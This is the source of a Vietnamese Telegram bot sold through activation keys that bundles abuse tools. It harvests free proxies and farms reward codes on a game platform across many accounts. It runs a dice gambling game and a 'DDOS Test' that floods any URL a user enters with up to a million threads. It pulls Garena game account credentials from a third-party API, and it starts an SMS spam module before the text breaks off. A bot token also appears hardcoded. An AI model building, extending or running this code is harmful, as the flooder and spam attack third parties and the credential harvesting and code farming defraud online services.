import os, asyncio, tempfile, logging, threading, concurrent.futures, time, re, json, random, string, secrets
from datetime import date, timedelta, datetime
from urllib.parse import urlparse
from queue import Queue

import requests
from bs4 import BeautifulSoup

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
)
from telegram.error import BadRequest

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8504373990:AAGrlPUjHjvO5P0XNWcWGk4DVzJAjqnfG2o"  # Thay token của bạn
DATA_FILE = "bot_user_data.json"
OWNER_USER_ID = int(os.environ.get("OWNER_ID", "0"))
ADMIN_USERNAME = "izedentiroty01"

# ==================== DỮ LIỆU ====================
user_data_store = {}
user_runtime = {}

def load_all_data():
    global user_data_store
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r', encoding='utf-8') as f:
            user_data_store = json.load(f)
    else:
        user_data_store = {"blacklist": [], "owner": OWNER_USER_ID, "bot_enabled": True, "keys": {}}
    if "bot_enabled" not in user_data_store: user_data_store["bot_enabled"] = True
    if "keys" not in user_data_store: user_data_store["keys"] = {}
    if "top_reset_date" not in user_data_store: user_data_store["top_reset_date"] = "2000-01-01"

def save_all_data():
    with open(DATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(user_data_store, f, indent=2)

def is_bot_enabled(): return user_data_store.get("bot_enabled", True)

def update_user_profile(user_id, update):
    uid = str(user_id)
    if uid not in user_data_store: user_data_store[uid] = {}
    user = update.effective_user
    user_data_store[uid]["profile"] = {
        "username": user.username, "first_name": user.first_name, "last_name": user.last_name
    }
    if "game" not in user_data_store[uid]:
        user_data_store[uid]["game"] = {"balance": 0, "bet_amount": 0, "received_welcome_bonus": False, "last_daily": None}
    if "activated_key" not in user_data_store[uid]:
        user_data_store[uid]["activated_key"] = None
    save_all_data()

def get_user_game_data(uid):
    u = str(uid)
    if u not in user_data_store: user_data_store[u] = {}
    if "game" not in user_data_store[u]:
        user_data_store[u]["game"] = {"balance": 0, "bet_amount": 0, "received_welcome_bonus": False, "last_daily": None}
    return user_data_store[u]["game"]

def get_user_xworld_data(uid):
    u = str(uid)
    if u not in user_data_store: user_data_store[u] = {}
    if "xworld" not in user_data_store[u]:
        user_data_store[u]["xworld"] = {"accounts":[],"codes":[],"threshold":5,"claimed_history":{},"limit_reached":[]}
    return user_data_store[u]["xworld"]

def get_user_antispam(uid):
    u = str(uid)
    if u not in user_data_store: user_data_store[u] = {}
    if "antispam" not in user_data_store[u]:
        user_data_store[u]["antispam"] = {"timestamps":[],"ban_until":0.0}
    return user_data_store[u]["antispam"]

def get_user_runtime(uid):
    if uid not in user_runtime:
        user_runtime[uid] = {"proxy_task":None,"proxy_msg":None,"proxy_stop_event":None,"monitor_task":None,"monitoring":False}
    return user_runtime[uid]

def is_blacklisted(uid): return str(uid) in user_data_store.get("blacklist",[])
def is_owner(uid): return uid == user_data_store.get("owner",0) and uid != 0

def format_money(amount): return f"{amount:,} VND"
def parse_money(text): return int(text.replace(",","").strip())

def check_antispam(uid):
    if is_owner(uid): return True
    if is_blacklisted(uid): return False
    a = get_user_antispam(uid)
    now = time.time()
    if a["ban_until"] > now:
        bl = user_data_store.setdefault("blacklist",[])
        if str(uid) not in bl: bl.append(str(uid)); save_all_data()
        return False
    timestamps = [t for t in a["timestamps"] if now - t < 4.0]
    a["timestamps"] = timestamps
    timestamps.append(now)
    if len(timestamps) >= 3:
        a["ban_until"] = now + 4*3600; a["timestamps"] = []
        save_all_data(); return False
    save_all_data(); return True

# ==================== KEY SYSTEM ====================
def generate_key():
    return ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(16))

def create_key(owner_id, duration_str=None):
    key = generate_key()
    now = datetime.utcnow()
    expires_at = None
    if duration_str:
        duration_str = duration_str.lower()
        match = re.match(r"(\d+)\s*(s|m|h|d|w|month|year)", duration_str)
        if match:
            num = int(match.group(1)); unit = match.group(2)
            if unit == "s": expires_at = now + timedelta(seconds=num)
            elif unit == "m": expires_at = now + timedelta(minutes=num)
            elif unit == "h": expires_at = now + timedelta(hours=num)
            elif unit == "d": expires_at = now + timedelta(days=num)
            elif unit == "w": expires_at = now + timedelta(weeks=num)
            elif unit == "month": expires_at = now + timedelta(days=num*30)
            elif unit == "year": expires_at = now + timedelta(days=num*365)
    user_data_store["keys"][key] = {
        "created_by": owner_id, "created_at": now.isoformat(),
        "expires_at": expires_at.isoformat() if expires_at else None, "assigned_to": None
    }
    save_all_data(); return key

def check_user_key(user_id):
    uid = str(user_id)
    user_data = user_data_store.get(uid, {})
    key = user_data.get("activated_key")
    if not key or key not in user_data_store.get("keys", {}): return False
    key_info = user_data_store["keys"][key]
    if key_info.get("assigned_to") != user_id: return False
    if key_info.get("expires_at"):
        expires = datetime.fromisoformat(key_info["expires_at"])
        if datetime.utcnow() > expires:
            del user_data_store["keys"][key]
            user_data_store[uid]["activated_key"] = None
            save_all_data(); return False
    return True

async def request_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"🔑 Bạn chưa có key sử dụng bot.\nVui lòng nhập key (liên hệ @{ADMIN_USERNAME} để được cấp)."
    )
    context.user_data["expect_key"] = True

async def process_key_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id; key = update.message.text.strip()
    keys = user_data_store.get("keys", {})
    if key not in keys: await update.message.reply_text("❌ Key không hợp lệ."); return
    key_info = keys[key]
    if key_info.get("assigned_to") is not None and key_info["assigned_to"] != uid:
        await update.message.reply_text("❌ Key này đã được sử dụng bởi người khác."); return
    if key_info.get("expires_at"):
        expires = datetime.fromisoformat(key_info["expires_at"])
        if datetime.utcnow() > expires: await update.message.reply_text("❌ Key này đã hết hạn."); return
    key_info["assigned_to"] = uid
    user_data_store[str(uid)]["activated_key"] = key
    context.user_data.pop("expect_key", None)
    save_all_data()
    await update.message.reply_text("✅ Key hợp lệ! Bạn có thể sử dụng bot ngay bây giờ. Gõ /menu để bắt đầu.")

# ==================== USER PROXY ====================
def get_user_proxy_string(user_id):
    uid = str(user_id)
    return user_data_store.get(uid, {}).get("proxy", None)

def set_user_proxy(user_id, proxy_str):
    uid = str(user_id)
    if uid not in user_data_store: user_data_store[uid] = {}
    user_data_store[uid]["proxy"] = proxy_str
    save_all_data()

def get_proxy_dict(user_id):
    proxy_str = get_user_proxy_string(user_id)
    if proxy_str:
        if proxy_str.startswith("socks5://") or proxy_str.startswith("http://") or proxy_str.startswith("https://"):
            return {"http": proxy_str, "https": proxy_str}
        else:
            return {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}
    return None

# ==================== PROXY (HTTP) ====================
def fetch_proxies_from_url_http(url, table_id=None, table_class=None, proxies=None):
    headers = {"User-Agent":"Mozilla/5.0"}
    proxies_list = []
    try:
        r = requests.get(url, headers=headers, timeout=15, proxies=proxies)
        r.raise_for_status()
        soup = BeautifulSoup(r.text, "html.parser")
        table = soup.find("table", id=table_id) if table_id else (soup.find("table", class_=table_class) if table_class else soup.find("table"))
        if not table: return proxies_list
        tbody = table.find("tbody")
        rows = tbody.find_all("tr") if tbody else table.find_all("tr")
        for row in rows:
            cols = row.find_all("td")
            if len(cols) >= 2:
                ip = cols[0].text.strip(); port = cols[1].text.strip()
                if ip and port: proxies_list.append(f"http://{ip}:{port}")
    except Exception as e: logger.error(f"Crawl {url}: {e}")
    return proxies_list

def fetch_proxies_from_github_raw_http(url, proxies=None):
    proxies_list = []
    try:
        resp = requests.get(url, timeout=15, proxies=proxies)
        if resp.status_code == 200:
            for item in re.split(r"\s+", resp.text.strip()):
                if not item or ":" not in item: continue
                if item.startswith(("https://","socks4://","socks5://")): continue
                proxies_list.append(item if item.startswith("http://") else f"http://{item}")
    except: pass
    return proxies_list

def fetch_proxies_from_text_url_http(url, proxies=None):
    proxies_list = []
    try:
        resp = requests.get(url, timeout=15, proxies=proxies)
        if resp.status_code == 200:
            for line in resp.text.splitlines():
                line = line.strip()
                if not line or ":" not in line: continue
                if line.startswith(("https://","socks4://","socks5://")): continue
                proxies_list.append(line if line.startswith("http://") else f"http://{line}")
    except: pass
    return proxies_list

def fetch_all_proxies_http(proxies=None):
    sources = [
        ("https://free-proxy-list.net/","proxylisttable",None),
        ("https://www.sslproxies.org/",None,"table"),
        ("https://us-proxy.org/","proxylisttable",None),
        ("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",None,None),
        ("https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",None,None),
        ("https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",None,None),
        ("https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",None,None),
        ("https://raw.githubusercontent.com/Proxy-Hub/proxy-list/main/http.txt",None,None),
        ("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",None,None),
        ("https://www.proxy-list.download/api/v1/get?type=http",None,None),
    ]
    allp = []
    for url, tid, tcl in sources:
        if tid or tcl: lst = fetch_proxies_from_url_http(url, tid, tcl, proxies)
        elif "raw.githubusercontent.com" in url or "proxy-list.download" in url or "proxyscrape" in url:
            lst = fetch_proxies_from_github_raw_http(url, proxies)
        else: lst = fetch_proxies_from_text_url_http(url, proxies)
        allp.extend(lst); time.sleep(0.5)
    unique, seen = [], set()
    for p in allp:
        if p not in seen: seen.add(p); unique.append(p)
    return unique

def check_proxy_http(proxy, test_url, timeout=15, proxies=None):
    try:
        s = time.time()
        r = requests.get(test_url, proxies={"http":proxy,"https":proxy}, timeout=timeout)
        if r.status_code == 200: return True, round(time.time()-s,3), proxy
    except: pass
    return False, None, proxy

def check_proxies_batch_http(proxies_list, test_url, timeout=15, max_workers=200, stop_event=None, user_proxies=None):
    if not proxies_list: return []
    live = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as exec:
        fut = {exec.submit(check_proxy_http, p, test_url, timeout, user_proxies): p for p in proxies_list}
        for f in concurrent.futures.as_completed(fut):
            if stop_event and stop_event.is_set(): break
            try:
                ok, rt, _ = f.result()
                if ok: live.append((fut[f], rt))
            except: pass
    return live

def check_proxies_from_file_http(path, test_url, timeout=15, max_workers=200, stop_event=None, user_proxies=None):
    try:
        with open(path, encoding="utf-8") as f: raw = [line.strip() for line in f if line.strip()]
    except: return []
    if not raw: return []
    clean = [f"http://{p}" if not p.startswith("http://") else p for p in raw]
    return check_proxies_batch_http(clean, test_url, timeout, max_workers, stop_event, user_proxies)

def multi_round_check_http(initial, test_url, rounds=3, interval_min=5, timeout=15, max_workers=200, stop_event=None, user_proxies=None):
    live = check_proxies_batch_http(initial, test_url, timeout, max_workers, stop_event, user_proxies)
    if stop_event and stop_event.is_set(): return []
    current = [p for p,_ in live]
    if not current: return []
    for r in range(2, rounds+1):
        if stop_event and stop_event.is_set(): return []
        for _ in range(interval_min*60):
            if stop_event and stop_event.is_set(): return []
            time.sleep(1)
        live = check_proxies_batch_http(current, test_url, timeout, max_workers, stop_event, user_proxies)
        if stop_event and stop_event.is_set(): return []
        current = [p for p,_ in live]
    return live

def format_proxy_list_short(lst):
    if not lst: return "Không có proxy nào."
    lines = [f"✅ Tổng proxy live: {len(lst)}"]
    for i,(p,t) in enumerate(lst):
        if i >= 50: lines.append(f"... và {len(lst)-50} proxy khác."); break
        lines.append(f"{p}  ({t}s)")
    return "\n".join(lines)

def create_result_file(lst):
    with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=".txt", encoding="utf-8") as f:
        f.write(f"Proxy list ({len(lst)} live)\n")
        for p,t in lst: f.write(f"{p}  ({t}s)\n")
        return f.name

# ==================== XWORLD ====================
def get_code_info(code, proxies=None):
    headers = {'accept':'*/*','accept-language':'vi,en;q=0.9','content-type':'application/json','country-code':'vn',
               'origin':'https://xworld-app.com','referer':'https://xworld-app.com/','user-agent':'Mozilla/5.0','xb-language':'vi-VN'}
    try:
        r = requests.post('https://web3task.3games.io/v1/task/redcode/detail', headers=headers,
                          json={'code':code,'os_ver':'android','platform':'h5','appname':'app'}, timeout=5, proxies=proxies).json()
        if r.get('code')==0 and r.get('message')=='ok':
            d = r['data']; ad = d['data']['admin']
            return {'status':True,'total':d['user_cnt'],'used':d['progress'],'remaining':d['user_cnt']-d['progress'],
                    'currency':d.get('currency','UNK'),'value':ad.get('ad_show_value',0),'name':ad.get('nick_name','Admin')}
    except: pass
    return {'status':False,'message':'Lỗi'}

def nhap_code(userId, secretKey, code, proxies=None):
    headers = {'accept':'*/*','content-type':'application/json','origin':'https://xworld.info','referer':'https://xworld.info/',
               'user-agent':'Mozilla/5.0','user-id':userId,'user-secret-key':secretKey,'xb-language':'vi-VN'}
    try:
        r = requests.post('https://web3task.3games.io/v1/task/redcode/exchange', headers=headers,
                          json={'code':code,'os_ver':'android','platform':'h5','appname':'app'}, timeout=5, proxies=proxies).json()
        if r.get('code')==0 and r.get('message')=='ok':
            val = r['data'].get('value',0); cur = r['data'].get('currency','')
            return True, f"SUCCESS|{userId}|{val}|{cur}"
        else:
            msg = r.get('message','').lower()
            if "limit" in msg: return False, "LIMIT_REACHED"
            if "reward has been received" in msg: return False, "CLAIMED"
            if "not exist" in msg or "finish" in msg: return False, "EXHAUSTED"
            return False, r.get('message','Unknown')
    except Exception as e: return False, str(e)

def parse_account_link(link):
    try:
        uid = link.split('?userId=')[1].split('&')[0]
        key = link.split('secretKey=')[1].split('&')[0]
        return uid, key
    except: return None, None

# ==================== GAME TÀI XỈU ====================
def game_menu_keyboard(uid):
    g = get_user_game_data(uid)
    txt = f"🎲 *Tài Xỉu*\n💰 Số dư: {format_money(g['balance'])}\n🎫 Cược: {format_money(g['bet_amount'])}"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💵 Đặt cược", callback_data="game_setbet")],
        [InlineKeyboardButton("📈 Tài", callback_data="game_tai"), InlineKeyboardButton("📉 Xỉu", callback_data="game_xiu")]
    ]), txt

# ==================== KEYBOARDS ====================
def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 Scan Proxy", callback_data="menu_proxy")],
        [InlineKeyboardButton("🎯 Canh Code XWorld", callback_data="menu_xworld")],
        [InlineKeyboardButton("🎲 Trò chơi Tài Xỉu", callback_data="game_menu")],
        [InlineKeyboardButton("💣 DDOS Test", callback_data="menu_ddos")],
        [InlineKeyboardButton("🎮 Scan Acc LQ", callback_data="menu_scanlq")],
        [InlineKeyboardButton("📧 Spam SMS", callback_data="menu_spam")]
    ])

def proxy_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📁 Check từ file", callback_data="proxy_check_file")],
        [InlineKeyboardButton("⚡ Check auto nhanh", callback_data="proxy_check_auto")],
        [InlineKeyboardButton("🕒 Check sống lâu", callback_data="proxy_check_long")],
        [InlineKeyboardButton("▶️ Bắt đầu quét", callback_data="proxy_start_scan")],
        [InlineKeyboardButton("🛑 Dừng quét", callback_data="proxy_stop_scan")]
    ])

def xworld_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⚙️ Cài đặt", callback_data="xw_settings")],
        [InlineKeyboardButton("➕ Thêm Code", callback_data="xw_add_code")],
        [InlineKeyboardButton("▶️ Bắt đầu canh", callback_data="xw_start_monitor")],
        [InlineKeyboardButton("⏹️ Dừng canh", callback_data="xw_stop_monitor")]
    ])

def xw_settings_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Thêm tài khoản", callback_data="xw_add_account")],
        [InlineKeyboardButton("📋 Xem tài khoản", callback_data="xw_view_accounts")],
        [InlineKeyboardButton("🎚️ Đặt ngưỡng", callback_data="xw_set_threshold")],
        [InlineKeyboardButton("🔙 Quay lại", callback_data="menu_xworld")]
    ])
# ==================== PROXY HANDLERS ====================
async def proxy_update_progress(update, uid, text):
    rt = get_user_runtime(uid); msg = rt.get("proxy_msg")
    if msg:
        try: await msg.edit_text(text, parse_mode="Markdown")
        except: pass

async def proxy_stop_scan(update, uid):
    rt = get_user_runtime(uid)
    if rt.get("proxy_stop_event"): rt["proxy_stop_event"].set()
    if rt.get("proxy_task") and not rt["proxy_task"].done(): rt["proxy_task"].cancel()
    rt["proxy_task"] = None; rt["proxy_msg"] = None; rt["proxy_stop_event"] = None

async def run_proxy_check(update, context, long_mode=False):
    uid = update.effective_user.id; rt = get_user_runtime(uid)
    if rt.get("proxy_task") and not rt["proxy_task"].done():
        await update.callback_query.edit_message_text("⚠️ Scan proxy đang chạy."); return
    msg = await update.callback_query.message.reply_text("🔄 Đang khởi tạo...")
    rt["proxy_msg"] = msg; ev = threading.Event(); rt["proxy_stop_event"] = ev
    user_proxies = get_proxy_dict(uid)
    loop = asyncio.get_running_loop()
    def block():
        try:
            asyncio.run_coroutine_threadsafe(proxy_update_progress(update,uid,"🌐 Đang crawl..."), loop)
            proxies = fetch_all_proxies_http(user_proxies)
            if ev.is_set(): return None
            if not proxies:
                asyncio.run_coroutine_threadsafe(proxy_update_progress(update,uid,"❌ Không lấy được proxy."), loop)
                return None
            asyncio.run_coroutine_threadsafe(proxy_update_progress(update,uid,f"📊 Đã lấy {len(proxies)} proxy. Đang kiểm tra..."), loop)
            if long_mode:
                return multi_round_check_http(proxies, "http://ip-api.com/json/", 3, 5, 15, 200, ev, user_proxies)
            else:
                return check_proxies_batch_http(proxies, "http://ip-api.com/json/", 15, 200, ev, user_proxies)
        except Exception as e: logger.error(f"blocking: {e}"); return None
    task = asyncio.create_task(loop.run_in_executor(None, block))
    rt["proxy_task"] = task
    try: live = await task
    except asyncio.CancelledError: await proxy_update_progress(update,uid,"⏹️ Đã hủy."); return
    except Exception as e: logger.error(f"proxy error: {e}"); await msg.edit_text("❌ Lỗi."); return
    finally: rt["proxy_task"] = None; rt["proxy_msg"] = None; rt["proxy_stop_event"] = None
    if ev.is_set(): return
    if not live: await msg.edit_text("❌ Không có proxy live."); return
    if len(live) <= 50: await msg.edit_text(format_proxy_list_short(live), parse_mode="Markdown")
    else:
        path = create_result_file(live)
        await msg.reply_document(open(path,"rb"), filename="proxy_live.txt")
        await msg.edit_text(f"✅ Hoàn tất! {len(live)} proxy live.", parse_mode="Markdown")
        os.unlink(path)

async def handle_proxy_file_upload(update, context):
    uid = update.effective_user.id; update_user_profile(uid, update)
    if not check_antispam(uid): return
    if not context.user_data.get("waiting_proxy_file"):
        await update.message.reply_text("Hãy dùng menu Proxy -> Check từ file."); return
    doc = update.message.document
    if not doc.file_name.endswith(".txt"): await update.message.reply_text("⚠️ Chỉ chấp nhận .txt"); return
    context.user_data["waiting_proxy_file"] = False
    await update.message.reply_text("⏳ Đang kiểm tra...")
    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".txt")
    await (await doc.get_file()).download_to_drive(tmp.name)
    path = tmp.name; ev = threading.Event()
    user_proxies = get_proxy_dict(uid)
    loop = asyncio.get_running_loop()
    try: live = await loop.run_in_executor(None, lambda: check_proxies_from_file_http(path, "http://ip-api.com/json/", 15, 200, ev, user_proxies))
    except Exception as e: await update.message.reply_text(f"❌ Lỗi: {e}"); return
    finally: os.unlink(path)
    if not live: await update.message.reply_text("❌ Không có proxy live."); return
    if len(live) <= 50: await update.message.reply_text(format_proxy_list_short(live))
    else:
        p = create_result_file(live); await update.message.reply_document(open(p,"rb"), filename="proxy_live.txt")
        await update.message.reply_text(f"✅ Hoàn tất! {len(live)} proxy live.", parse_mode="Markdown")
        os.unlink(p)

# ==================== XWORLD HANDLERS ====================
async def xworld_send_msg(chat_id, text, context):
    try: await context.bot.send_message(chat_id, text, parse_mode='Markdown', disable_web_page_preview=True)
    except: pass

async def xworld_monitor_loop(user_id, chat_id, context):
    rt = get_user_runtime(user_id); data = get_user_xworld_data(user_id)
    codes = data["codes"]; accounts = data["accounts"]; threshold = data["threshold"]
    claimed = data["claimed_history"]; limit = data["limit_reached"]
    rt["monitoring"] = True
    user_proxies = get_proxy_dict(user_id)
    await xworld_send_msg(chat_id, "🔍 Bắt đầu quét API...", context)
    while rt["monitoring"]:
        for item in codes[:]:
            code = item["code"]; info = get_code_info(code, user_proxies)
            if not info["status"]: await xworld_send_msg(chat_id, f"⚠️ Code `{code}` lỗi.", context); continue
            remaining = info["remaining"]; item["info"] = info; save_all_data()
            if remaining <= 0: codes.remove(item); await xworld_send_msg(chat_id, f"🏁 Code `{code}` hết.", context); save_all_data(); continue
            if 0 < remaining <= threshold:
                await xworld_send_msg(chat_id, f"⚡️ Code `{code}` còn {remaining}/{info['total']} lượt. TẤN CÔNG!", context)
                loop = asyncio.get_running_loop()
                for acc in accounts:
                    if acc["user_id"] in limit or code in claimed.get(acc["user_id"], []): continue
                    if not rt["monitoring"]: break
                    success, msg = await loop.run_in_executor(None, nhap_code, acc["user_id"], acc["secret_key"], code, user_proxies)
                    uid = acc["user_id"]
                    if success:
                        _, u, v, c = msg.split('|')
                        await xworld_send_msg(chat_id, f"✅ `{uid}` nhận {v} {c}", context)
                        claimed.setdefault(uid,[]).append(code)
                    else:
                        if msg == "LIMIT_REACHED":
                            if uid not in limit: limit.append(uid)
                        elif msg == "EXHAUSTED": break
                info2 = get_code_info(code, user_proxies)
                if info2["status"] and info2["remaining"] <= 0:
                    codes.remove(item); await xworld_send_msg(chat_id, f"🏁 Code `{code}` cạn.", context)
                save_all_data()
        await asyncio.sleep(1.5)
    await xworld_send_msg(chat_id, "⏹️ Dừng canh.", context)

async def start_xworld_monitor(update, context):
    uid = update.effective_user.id; data = get_user_xworld_data(uid); rt = get_user_runtime(uid)
    if rt.get("monitoring"): await update.callback_query.edit_message_text("⚠️ Đang canh rồi."); return
    if not data["accounts"]: await update.callback_query.answer("Chưa có tài khoản!", show_alert=True); return
    if not data["codes"]: await update.callback_query.answer("Chưa có code!", show_alert=True); return
    rt["monitor_task"] = asyncio.create_task(xworld_monitor_loop(uid, update.effective_chat.id, context))
    await update.callback_query.edit_message_text(f"✅ Bắt đầu canh! Ngưỡng: {data['threshold']}", parse_mode='Markdown', reply_markup=xworld_menu_keyboard())

async def stop_xworld_monitor(update, context):
    rt = get_user_runtime(update.effective_user.id)
    if rt.get("monitoring"): rt["monitoring"] = False; rt.get("monitor_task").cancel(); await update.callback_query.edit_message_text("⏹️ Đã dừng.", reply_markup=xworld_menu_keyboard())
    else: await update.callback_query.answer("Không có phiên canh nào.")

# ==================== GAME HANDLERS ====================
async def game_setbet_prompt(update, context):
    await update.callback_query.edit_message_text("Chọn cách cược:", reply_markup=InlineKeyboardMarkup([
        [InlineKeyboardButton("💵 Nhập số tiền", callback_data="game_input_bet")],
        [InlineKeyboardButton("🔥 All in", callback_data="game_allin")]
    ]))

async def game_input_bet(update, context):
    context.user_data["expect_game_bet"] = True
    await update.callback_query.edit_message_text("Nhập số tiền cược (VD: 50,000 hoặc 50000):")

async def game_allin(update, context):
    uid = update.effective_user.id; g = get_user_game_data(uid)
    if g["balance"] <= 0: await update.callback_query.edit_message_text("❌ Hết tiền."); return
    g["bet_amount"] = g["balance"]; save_all_data()
    mk, _ = game_menu_keyboard(uid)
    await update.callback_query.edit_message_text(f"✅ All in: {format_money(g['bet_amount'])}", reply_markup=mk)

async def process_game_bet_amount(update, context):
    uid = update.effective_user.id
    try: amount = parse_money(update.message.text.strip())
    except: await update.message.reply_text("❌ Số không hợp lệ."); return
    if amount <= 0: await update.message.reply_text("❌ >0."); return
    g = get_user_game_data(uid)
    if amount > g["balance"]: await update.message.reply_text(f"❌ Chỉ có {format_money(g['balance'])}"); return
    g["bet_amount"] = amount; save_all_data()
    context.user_data.pop("expect_game_bet", None)
    mk, _ = game_menu_keyboard(uid)
    await update.message.reply_text(f"✅ Đặt cược: {format_money(amount)}", reply_markup=mk)

async def play_tai_xiu(update, context, choice):
    uid = update.effective_user.id; g = get_user_game_data(uid)
    if g["bet_amount"] <= 0: await update.callback_query.edit_message_text("❌ Chưa đặt cược."); return
    bet = g["bet_amount"]; result = random.randint(1,6)+random.randint(1,6)+random.randint(1,6)
    is_tai = result >= 11; win = (choice == "tai" and is_tai) or (choice == "xiu" and not is_tai)
    if win: g["balance"] += bet; msg = f"🎉 Tài ({result}). Thắng +{format_money(bet)}\nSố dư: {format_money(g['balance'])}"
    else: g["balance"] -= bet; msg = f"😞 Xỉu ({result}). Thua -{format_money(bet)}\nSố dư: {format_money(g['balance'])}"
    g["bet_amount"] = 0; save_all_data()
    mk, _ = game_menu_keyboard(uid)
    await update.callback_query.edit_message_text(msg, reply_markup=mk)

# ==================== DDOS (STRESS TEST) ====================
stress_tasks = {}
def is_valid_url(url): return urlparse(url).scheme in ['http','https'] and urlparse(url).netloc
def ddos_worker(url, stop_event, stats_queue):
    while not stop_event.is_set():
        try: r = requests.get(url, timeout=5); stats_queue.put(('ok',r.status_code))
        except requests.exceptions.Timeout: stats_queue.put(('timeout',None))
        except requests.exceptions.ConnectionError: stats_queue.put(('conn_err',None))
        except Exception as e: stats_queue.put(('error',str(e)))

async def run_stress_test(update, context, chat_id, url, threads, duration):
    ev = threading.Event(); stress_tasks[chat_id] = ev; q = Queue()
    workers = [threading.Thread(target=ddos_worker, args=(url, ev, q)) for _ in range(threads)]
    for t in workers: t.daemon = True; t.start()
    await context.bot.send_message(chat_id, f"🚀 Test {url} với {threads} luồng trong {duration}s")
    s_ok = s_timeout = s_err = 0; start = time.time()
    while time.time() - start < duration:
        while not q.empty():
            m = q.get_nowait()
            if m[0]=='ok': s_ok+=1
            elif m[0]=='timeout': s_timeout+=1
            else: s_err+=1
        await asyncio.sleep(0.5)
    ev.set(); [t.join() for t in workers]
    await context.bot.send_message(chat_id, f"✅ Xong! OK: {s_ok}, Timeout: {s_timeout}, Lỗi: {s_err}")
    stress_tasks.pop(chat_id, None)

async def ddos_input_url(update, context):
    context.user_data['expect_ddos'] = 'url'
    await update.callback_query.edit_message_text("Nhập URL cần test (http:// hoặc https://):")
async def ddos_input_threads(update, context, url):
    context.user_data['ddos_url'] = url; context.user_data['expect_ddos'] = 'threads'
    await update.message.reply_text("Nhập số luồng (1-1000000):")
async def ddos_input_duration(update, context, threads):
    context.user_data['ddos_threads'] = threads; context.user_data['expect_ddos'] = 'duration'
    await update.message.reply_text("Nhập thời gian (giây, 1-60):")

def ddos_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 Nhập web & bắt đầu", callback_data="ddos_start")],
        [InlineKeyboardButton("🛑 Dừng test", callback_data="ddos_stop")]
    ])

# ==================== SCAN ACCOUNT LIÊN QUÂN (FIXED) ====================
scan_lq_tasks = {}
def create_garena_account(session):
    for attempt in range(3):
        try:
            r = session.get("https://keyherlyswar.x10.mx/Apidocs/reg/reglq.php", timeout=30)
            if r.status_code != 200:
                if attempt < 2: continue
                return False, None, None, f"HTTP {r.status_code}"
            data = r.json()
            if not data.get("status") or not data.get("result"):
                if attempt < 2: continue
                return False, None, None, "API không hợp lệ"
            info = data["result"][0]
            username = info.get("account") or info.get("username", "")
            password = info.get("password", "")
            if not username or not password:
                if attempt < 2: continue
                return False, None, None, "Thiếu user/pass"
            return True, username, password, "OK"
        except requests.exceptions.ReadTimeout:
            if attempt < 2: continue
            return False, None, None, "Timeout (read)"
        except requests.exceptions.ConnectionError:
            if attempt < 2: continue
            return False, None, None, "Connection error"
        except Exception as e:
            if attempt < 2: continue
            return False, None, None, str(e)
    return False, None, None, "Max retries"

async def scan_lq_worker(chat_id, quantity, context):
    ev = threading.Event(); scan_lq_tasks[chat_id] = ev
    proxies = get_proxy_dict(chat_id)
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (compatible; LQBot/1.0)"})
    if proxies: session.proxies.update(proxies)
    created = 0
    for i in range(1, quantity + 1):
        if ev.is_set(): break
        ok, user, pwd, msg = create_garena_account(session)
        if ok and user and pwd:
            created += 1
            await context.bot.send_message(chat_id, f"✅ #{i}: {user} : {pwd}")
        else:
            await context.bot.send_message(chat_id, f"❌ #{i}: Thất bại ({msg})")
        if i < quantity: await asyncio.sleep(0.5)
    await context.bot.send_message(chat_id, f"🏁 Hoàn tất {created}/{quantity} tài khoản.")
    scan_lq_tasks.pop(chat_id, None)

async def scan_lq_infinite(chat_id, context):
    ev = threading.Event(); scan_lq_tasks[chat_id] = ev
    proxies = get_proxy_dict(chat_id)
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (compatible; LQBot/1.0)"})
    if proxies: session.proxies.update(proxies)
    count = 0
    await context.bot.send_message(chat_id, "♾️ Scan liên tục! Dùng nút Dừng để dừng.")
    while not ev.is_set():
        ok, user, pwd, msg = create_garena_account(session)
        if ok and user and pwd:
            count += 1
            await context.bot.send_message(chat_id, f"✅ #{count}: {user} : {pwd}")
        else:
            await context.bot.send_message(chat_id, f"❌ Lần {count+1}: Thất bại ({msg})")
        await asyncio.sleep(0.5)
    await context.bot.send_message(chat_id, "⏹️ Đã dừng scan liên tục.")
    scan_lq_tasks.pop(chat_id, None)

def scan_lq_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔢 Scan số lượng", callback_data="scanlq_quantity")],
        [InlineKeyboardButton("♾️ Scan liên tục", callback_data="scanlq_infinite")],
        [InlineKeyboardButton("🛑 Dừng scan", callback_data="scanlq_stop")]
    ])

# ==================== SPAM SMS (placeholder cho 76 hàm) ====================
last_names = ['Nguyễn', 'Trần', 'Lê', 'Phạm', 'Vũ', 'Hoàng']
middle_names = ['Văn', 'Thị', 'Quang', 'Hoàng', 'Anh', 'Thanh']
first_names = ['Nam', 'Tuấn', 'Hương', 'Linh', 'Long', 'Duy']

def rand_name():
